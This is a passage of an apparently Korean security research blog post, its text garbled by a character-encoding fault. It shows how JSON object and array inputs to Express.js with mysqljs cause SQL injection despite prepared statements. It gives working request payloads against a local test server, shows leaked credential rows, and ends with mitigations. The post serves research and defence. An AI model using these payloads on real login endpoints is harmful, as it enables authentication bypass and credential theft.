    <span class="k">if</span> <span class="p">(</span><span class="nx">len</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">len</span> <span class="o">===</span> <span class="mi">2</span>
      <span class="p">?</span> <span class="nx">SqlString</span><span class="p">.</span><span class="nx">escapeId</span><span class="p">(</span><span class="nx">values</span><span class="p">[</span><span class="nx">valuesIndex</span><span class="p">])</span>
      <span class="p">:</span> <span class="nx">SqlString</span><span class="p">.</span><span class="nx">escape</span><span class="p">(</span><span class="nx">values</span><span class="p">[</span><span class="nx">valuesIndex</span><span class="p">],</span> <span class="nx">stringifyObjects</span><span class="p">,</span> <span class="nx">timeZone</span><span class="p">);</span>

    <span class="nx">result</span> <span class="o">+=</span> <span class="nx">sql</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">chunkIndex</span><span class="p">,</span> <span class="nx">match</span><span class="p">.</span><span class="nx">index</span><span class="p">)</span> <span class="o">+</span> <span class="nx">value</span><span class="p">;</span>
    <span class="nx">chunkIndex</span> <span class="o">=</span> <span class="nx">placeholdersRegex</span><span class="p">.</span><span class="nx">lastIndex</span><span class="p">;</span>
    <span class="nx">valuesIndex</span><span class="o">++</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="nx">chunkIndex</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// Nothing was replaced</span>
    <span class="k">return</span> <span class="nx">sql</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">if</span> <span class="p">(</span><span class="nx">chunkIndex</span> <span class="o">&lt;</span> <span class="nx">sql</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">result</span> <span class="o">+</span> <span class="nx">sql</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">chunkIndex</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p><code class="highlighter-rouge">SqlString.format</code> í•¨ìˆ˜ëŠ” ë‚´ë¶€ì—ì„œ <code class="highlighter-rouge">escape</code> í•¨ìˆ˜ë¥¼ í†µí•´ SQLë¬¸ì„ escape í•´ì£¼ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<p>ì´ì œ ì›ë¦¬ë¥¼ ì•Œì•˜ìœ¼ë‹ˆ ê·¸ëŸ¬ë©´ ìœ„ì—ì„œ SQLi ê³µê²©ì„ í•˜ëŠ” ë˜‘ê°™ì€ ìš”ì²­ì„ ë³´ëƒˆì„ ë•Œ ì–´ë–»ê²Œ ë ê¹Œìš”?</p>

<p>ì˜ˆìƒ í•˜ì‹ ëŒ€ë¡œ <code class="highlighter-rouge">ì‹¤íŒ¨!</code> ì…ë‹ˆë‹¤.</p>

<p>ì–´ë–¤ ì¼ì´ ë²Œì–´ì¡ŒëŠ”ì§€ MySQL Query Logë¥¼ ì‚´í´ë³¼ê¹Œìš”?</p>

<p><img src="/assets/2020-10-01/202010_soo1.png" alt="/assets/2020-10-01/202010_soo1.png" /></p>

<center><b>MySQL Query Log</b></center>

<p>ê°™ì€ ìš”ì²­ì„ ë³´ëƒˆì§€ë§Œ <code class="highlighter-rouge">"</code>ê°€ escape ì²˜ë¦¬ ë˜ë©´ì„œ Queryê°€ ì•„ë‹Œ ë¬¸ìì—´ë¡œ ì·¨ê¸‰ë˜ê¸° ë•Œë¬¸ì— Injectionì´ ë°œìƒí•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.</p>

<p>ì¦‰ <code class="highlighter-rouge">Prepared Statement</code>ë¥¼ ì‚¬ìš©í•¨ìœ¼ë¡œì¨ ì‚¬ìš©ìê°€ ì…ë ¥í•œ Inputì„ ì¿¼ë¦¬ë¡œ ì‚¬ìš©í•˜ëŠ” ì¼ì€ ì—†ì–´ì¡Œì–´ìš”!</p>

<h2 id="ë˜-ë‹¤ì‹œ-sqli">ë˜ ë‹¤ì‹œ SQLi</h2>

<p>ê·¸ëŸ¼ ì´ì œ ì•ˆì „í• ê¹Œìš”? ì•ˆì „í–ˆë‹¤ë©´ ì €ëŠ” ì´ ê¸€ì„ ì“°ê³  ìˆì§€ ì•Šì•˜ì„ ê±°ì˜ˆìš” :)</p>

<p>ì•„ì£¼ ì œí•œì ì¸ SQLië¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ ğŸ˜‚ğŸ˜‚ğŸ˜‚</p>

<p><code class="highlighter-rouge">Express.js</code>ì—ì„œëŠ” JSON Typeìœ¼ë¡œ ì…ë ¥ì„ ë°›ì„ ìˆ˜ ìˆê³  <code class="highlighter-rouge">res.body.id</code>ì— JSON Typeì˜ Objectë¥¼ ë„£ì–´ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ì¸ ìƒí™©ì—ì„œëŠ” <code class="highlighter-rouge">Prepared Statement</code>ë¥¼ ì‚¬ìš©í•¨ìœ¼ë¡œì¨ ëŒ€ë¶€ë¶„ì˜ SQLi ì·¨ì•½ì ì— ëŒ€ì‘í•  ìˆ˜ ìˆì§€ë§Œ  Objectë¥¼ ë„£ì„ ìˆ˜ ìˆëŠ” ìƒí™©ì—ì„œëŠ” ë˜ ì–˜ê¸°ê°€ ë‹¬ë¼ì§‘ë‹ˆë‹¤. ğŸ¤”ğŸ¤”ğŸ¤”</p>

<p><code class="highlighter-rouge">SqlString.escape</code> í•¨ìˆ˜ì— Objectê°€ ë“¤ì–´ê°”ì„ë•Œ ì–´ë–»ê²Œ ë˜ëŠ”ì§€ì— ëŒ€í•œ ì˜ˆì‹œëŠ” ì•„ë˜ì˜ URLì— ì •ë¦¬ê°€ ì˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì°¸ê³ í•´ì£¼ì„¸ìš”.</p>

<p><a href="https://github.com/mysqljs/mysql/blob/ad014c82b2cbaf47acae1cc39e5533d3cb6eb882/test/unit/protocol/test-SqlString.js">mysqljs/mysql</a></p>

<p>ê²°ë¡ ì ìœ¼ë¡œ SQLi ì·¨ì•½ì ì´ ë°œìƒí•˜ëŠ” ëª‡ê°€ì§€ ì˜ˆì‹œ ë¨¼ì € ë³´ì—¬ ë“œë¦¬ìë©´ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p>

<h3 id="case-1">Case 1</h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json

{"id":0}
</code></pre></div></div>

<p><img src="/assets/2020-10-01/202010_soo2.png" alt="/assets/2020-10-01/202010_soo2.png" /></p>

<center><b>MySQL Query Log</b></center>

<p>MySQL Query Logë¥¼ ì‚´í´ë³´ë©´ ìœ„ì™€ ê°™ìŠµë‹ˆë‹¤. ì–´ë–¤ ì¼ì´ ë²Œì–´ì§ˆê¹Œìš”?</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 57
Date: Tue, 29 Sep 2020 13:08:36 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"admin","pw":"hello"},{"id":"guest","pw":"guest"}]
</code></pre></div></div>

<p>ì„œë²„ë¡œ ë¶€í„° ìœ„ì™€ ê°™ì€ ì‘ë‹µì´ ì™”ìŠµë‹ˆë‹¤.</p>

<p>ì´ìœ ë¥¼ ì„¤ëª… ë“œë¦¬ìë©´ MySQLì˜ idëŠ” text Typeì…ë‹ˆë‹¤. 0ì¸ intí˜• ìˆ«ìì™€ ë¹„êµí–ˆê¸° ë•Œë¬¸ì— ìˆ«ìë¡œ ì‹œì‘í•˜ëŠ” idê°€ ì•„ë‹Œ <code class="highlighter-rouge">admin</code>, <code class="highlighter-rouge">guest</code>ì˜ ê²°ê³¼ ê°’ì„ í™•ì¸í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json

{"id":[0]}
</code></pre></div></div>

<p>ìœ„ì™€ ê°™ì´ <code class="highlighter-rouge">{"id":[0]}</code>ì€ <code class="highlighter-rouge">{"id":0}</code>ê³¼ ë˜‘ê°™ì€ ê²°ê³¼ê°€ ëŒì•„ì˜µë‹ˆë‹¤.</p>

<p>ê·¸ë ‡ë‹¤ë©´ 0ì´ ì•„ë‹Œ ë‹¤ë¥¸ ìˆ«ìë¥¼ ì…ë ¥ í–ˆì„ ë• ì–´ë–¤ ê²°ê³¼ë¥¼ ë‚˜ì˜¬ê¹Œìš”?</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json
Content-Length: 8
Pragma: no-cache

{"id":1}
</code></pre></div></div>

<p><img src="/assets/2020-10-01/202010_soo3.png" alt="/assets/2020-10-01/202010_soo3.png" /></p>

<center><b>MySQL Query Log</b></center>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 26
Date: Tue, 29 Sep 2020 13:13:15 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"1test","pw":"pw"}]
</code></pre></div></div>

<p>1ì„ ë„£ìœ¼ë©´ ìœ„ì™€ ê°™ì€ ì´ìœ (textì™€ intì˜ ë¹„êµ)ë¡œ 1ë¡œ ì‹œì‘í•˜ëŠ” ê³„ì •ì¸ <code class="highlighter-rouge">1test</code>ê°€ ëŒì•„ì˜µë‹ˆë‹¤.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json
Content-Length: 8
Pragma: no-cache

{"id":2}
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 26
ETag: W/"1a-RTcXGpGSUcZVtJ0k1TC9IOCdYLg"
Date: Tue, 29 Sep 2020 13:13:18 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"2test","pw":"pw"}]
</code></pre></div></div>

<p>2ì„ ë„£ìœ¼ë©´ ìœ„ì™€ ê°™ì€ ì´ìœ (textì™€ intì˜ ë¹„êµ)ë¡œ 2ë¡œ ì‹œì‘í•˜ëŠ” ê³„ì •ì¸ <code class="highlighter-rouge">2test</code>ê°€ ëŒì•„ì˜µë‹ˆë‹¤.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json
Content-Length: 10
Pragma: no-cache

{"id":123}
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 28
ETag: W/"1c-zKsnpl5rZNcQDMNwS5q2y5F0oEs"
Date: Tue, 29 Sep 2020 13:13:20 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"123test","pw":"pw"}]
</code></pre></div></div>

<p>123ì„ ë„£ìœ¼ë©´ ìœ„ì™€ ê°™ì€ ì´ìœ (textì™€ intì˜ ë¹„êµ)ë¡œ 123ìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ê³„ì •ì¸ <code class="highlighter-rouge">123test</code>ê°€ ëŒì•„ì˜µë‹ˆë‹¤.</p>

<p><strong>ê³„ì •ì˜ ì „ì²´ IDë¥¼ ëª¨ë¥´ëŠ” ìƒí™©ì—ì„œ ìˆ«ìë¡œ ì‹œì‘í•˜ëŠ” ê³„ì •ì— ì ‘ê·¼í•˜ê±°ë‚˜ ë§¨ ìœ„(idxê°€ ê°€ì¥ ë‚®ì€)ì— ìˆëŠ” Rowì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.</strong></p>

<h3 id="case-2">Case 2</h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:3000/login HTTP/1.1
Host: 127.0.0.1:3000
content-type: application/json

{"id":{"id":"1"}}
</code></pre></div></div>

<p>ì´ë²ˆì—ëŠ” ìœ„ì™€ ê°™ì€ ìš”ì²­ì„ ë³´ë‚´ ë³´ê² ìŠµë‹ˆë‹¤.</p>

<p><code class="highlighter-rouge">{"id":"1"}</code>ëŠ” escape í•¨ìˆ˜ë¥¼ í†µí•´ì„œ ``id<code class="highlighter-rouge"> = '1'</code>ì™€ ê°™ì´ ì¹˜í™˜ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ ì‹¤ì œë¡œ ì–´ë–¤ ì¼ì´ ì¼ì–´ë‚ ê¹Œìš”?</p>

<p>MySQL Query Logë¥¼ ì‚´í´ë´…ì‹œë‹¤!</p>

<p><img src="/assets/2020-10-01/202010_soo4.png" alt="/assets/2020-10-01/202010_soo4.png" /></p>

<center><b>MySQL Query Log</b></center>

<p>ì„¸ìƒì—â€¦ ğŸ¤¦â€â™‚ï¸ğŸ¤¦â€â™‚ï¸ğŸ¤¦â€â™‚ï¸</p>

<p>ì €ëŸ° Queryë¬¸ì´ë¼ë©´ injectionì„ í†µí•´ 1=1ì„ ë§Œë“  ê²°ê³¼ì™€ ë‹¤ë¥¼ ê²Œ ì—†ê² ëŠ”ë°ìš”?</p>

<p>ë„¤, ë§ìŠµë‹ˆë‹¤!!!</p>

<p>column ëª…ì„ ì•Œê³  ìˆëŠ” ê²½ìš° ìœ„ì™€ ê°™ì€ Injectionì´ ê°€ëŠ¥í•˜ê²Œ ë©ë‹ˆë‹¤!</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 160
Date: Tue, 29 Sep 2020 13:21:20 GMT
Connection: keep-alive
Cache-Control: no-cache

[{"id":"admin","pw":"hello"},{"id":"guest","pw":"guest"},{"id":"1test","pw":"pw"},{"id":"12test","pw":"pw"},{"id":"2test","pw":"pw"},{"id":"123test","pw":"pw"}]
</code></pre></div></div>

<p>ì‹¤ì œë¡œ ì„œë²„ì—ì„œ ì˜¨ ì‘ë‹µì„ ì‚´í´ë³´ë©´ ëª¨ë“  Rowë¥¼ ë°›ì•„ì˜¨ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<p>ë˜í•œ ìœ„ ë°©ë²•ìœ¼ë¡œ column ì´ë¦„ì„ Brute Force ê³µê²©ì„ í†µí•´ ì•Œì•„ë‚¼ ìˆ˜ ë„ ìˆìŠµë‹ˆë‹¤.</p>

<p>ì´ ì™¸ì—ë„ Objectê°€ ì§ì ‘ query í•¨ìˆ˜ì˜ ì…ë ¥ ê°’ìœ¼ë¡œ ë“¤ì–´ê°ˆ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ë‹¤ì–‘í•œ ì·¨ì•½ì ì´ ë°œìƒ ë  ê²ƒì´ë¼ê³  ìƒê°ë©ë‹ˆë‹¤. ë‹¤ë¥¸ ê²½ìš°ë“¤ì€ ì•ìœ¼ë¡œ ì—°êµ¬í•´ì•¼ í•  í•„ìš”ê°€ ìˆì„ê²ƒ ê°™ì•„ìš”.</p>

<h2 id="ëŒ€ì‘-ë°©ì•ˆ">ëŒ€ì‘ ë°©ì•ˆ</h2>

<p>ê·¸ëŸ¬ë©´ ì–´ë–»ê²Œ ëŒ€ì‘ í•  ìˆ˜ ìˆì„ê¹Œìš”?</p>

<p>Queryì— Objectê°€ ì§ì ‘ ë“¤ì–´ê°€ê¸° ë•Œë¬¸ì— ë°œìƒí•œ ë¬¸ì œì˜€ìœ¼ë‹ˆê¹ toString() í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ì„œ í•´ê²° í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<p>ë˜í•œ Prepared Statementì—ì„œ <code class="highlighter-rouge">??</code> ë¬¼ìŒí‘œë¥¼ 2ê°œ ì‚¬ìš©í•˜ê²Œ ë˜ë©´ ë‚´ë¶€ì ìœ¼ë¡œ toString í•¨ìˆ˜ê°€ ì ìš©ë˜ì–´ ìœ„ ì·¨ì•½ì ì— ëŒ€ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<p>toString()ì„ ì ìš©í•˜ê²Œ ë˜ë©´ ì•„ë˜ì™€ ê°™ì´ Objectê°€ ë¬¸ìì—´ë¡œ ë“¤ì–´ê°€ê²Œ ë©ë‹ˆë‹¤!</p>

<p><img src="/assets/2020-10-01/202010_soo5.png" alt="/assets/2020-10-01/202010_soo5.png" /></p>

<h1 id="ë§ˆë¬´ë¦¬">ë§ˆë¬´ë¦¬</h1>

<p>ì´ë²ˆì—ëŠ” Express.js + MySQLì„ ì‚¬ìš©í•  ë•Œ ë°œìƒí•  ìˆ˜ ìˆëŠ” SQLi ì·¨ì•½ì ê³¼ Prepared Statementë¥¼ ì ìš© í–ˆì„ ë•Œë„ SQLi ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆë‹¤ëŠ” ë‚´ìš©ì„ ì‚´í´ë´¤ìŠµë‹ˆë‹¤.</p>

<p>Prepared Statementë¥¼ ì‚¬ìš©í•˜ë©´ ë¬´ì¡°ê±´ ì•ˆì „ í•  ê²ƒì´ë‹¤, escape í•¨ìˆ˜ì— 0-day ì·¨ì•½ì ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´ ì•ˆì „í•  ê²ƒì´ë¼ê³  ìƒê°í–ˆë˜ <code class="highlighter-rouge">ìƒê°ì˜ í‹€</code>ì„ ê¹¨ ì£¼ì—ˆë˜ ì—°êµ¬ì˜€ìŠµë‹ˆë‹¤.</p>

<p>ì—¬ëŸ¬ë¶„ ëª¨ë‘ ê³ ì •ì ì¸ ì‚¬ê³ ë¥¼ ë²—ì–´ë‚˜ ì·¨ì•½ì ì„ ì°¾ì•„ë´…ì‹œë‹¤. ğŸ˜‚</p>

   </div>
</div>


  <!-- Start disqus 
<script src="/assets/js/disqusLoader.js" /></script>
<div id="disqus_thread"><h3>Discussion and feedback</h3></div>
<div class="disqus"></div>
<script>
    disqusLoader('.disqus', {
        scriptUrl: 'https://jekyll-tale.disqus.com/embed.js'
    });
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
End disqus -->


<div class="pagination">
  
   <a href="/2020-10-01/Hide-JavaScript-Code-in-PNG-1d24960c8d174fce8729f7f8003fce4b" class="left arrow">&#8592;</a>
  
  
   <a href="/2020-10-01/Does-linux-dream-of-windows-6a288da619ca4f39a80156209db1e977" class="right arrow">&#8594;</a>
  

  <a href="#" class="top">Top</a>
</div>
    </main>

    <!--footer>
  <span>
    &copy; <time datetime="2022-04-20 22:14:58 +0000">2022</time> Core-Research-Team. Made with Jekyll using the <a href="https://github.com/chesterhow/tale/">Tale</a> theme.
  </span>
</footer-->

  </body>
</html>
